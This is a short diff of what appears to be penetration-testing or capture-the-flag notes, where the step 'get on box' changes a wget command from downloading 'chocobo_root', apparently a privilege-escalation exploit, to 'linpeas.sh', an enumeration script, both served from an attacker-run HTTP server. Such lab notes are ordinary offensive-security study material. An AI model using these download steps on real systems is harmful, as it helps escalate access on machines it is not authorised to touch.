@@ -189,5 +189,5 @@ sudo python -m SimpleHTTPServer
 get on box
 
 ```
-wget http://10.4.9.144:8000/chocobo_root
+wget http://10.4.9.144:8000/linpeas.sh
 ```
